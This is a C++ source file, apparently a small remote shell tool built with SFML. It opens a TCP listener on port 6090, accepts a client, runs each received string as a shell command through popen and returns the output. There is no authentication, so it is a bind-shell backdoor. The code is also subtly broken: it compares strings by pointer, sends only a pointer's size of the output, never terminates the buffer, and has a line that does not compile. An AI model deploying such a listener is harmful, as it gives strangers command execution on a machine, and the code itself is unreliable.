#include <iostream>

#include <SFML/Network.hpp>

#include <time.h>
#include <stdio.h>

#include "parts/ansi.h" 

using std::string;

#define PORT 6090
sf::IpAddress HOST = sf::IpAddress::getLocalAddress();





sf::TcpListener listener;
sf::TcpSocket client;

bool acceptClient();
string exec(const char* cmd);
int main(int argc, const char* argv[1])
{

    if(listener.listen(PORT) != sf::Socket::Done)
    {
        std::cout << red << "error: on creating listener\n" << reset; 
        return 1;
    }

    acceptClient();

    size_t received;
    char receiveBuffor[256];
    while(true)
    {
        if(client.receive(receiveBuffor, 256, received) != sf::Socket::Done)
        {
            std::cout << red << "error: on receiving data\n" << reset;
        }
        if(receiveBuffor == "_exit")
        {
            client.disconnect();

        }
        
        string ret = exec(receiveBuffor);

        std::cout << ret;
        putchar('\n');

        if(client.send(ret.c_str(), sizeof(ret.c_str())) != sf::Socket::Done)
        {
            std::cout << red << "error: on returning command output\n" << reset;
        }
    }

    return 0;
}

bool acceptClient()
{
    if(listener.accept(client) != sf::Socket::Done)
    {
        std::cout << red << "error: on accepting client\n" reset;
        return 1;
    }
    std::cout << green << "Accepted connection from: " << blue << client.getRemoteAddress() << '\n' << reset; 
    return 0;
}

string exec(const char* cmd)
{
    char buff[256];
    string result;

    FILE* fd = popen(cmd, "r");

    // use buffer to read and add to result
    while(fgets(buff, 256, fd) != NULL)
    {
        result += buff;
    }

    pclose(fd);

    return result;
}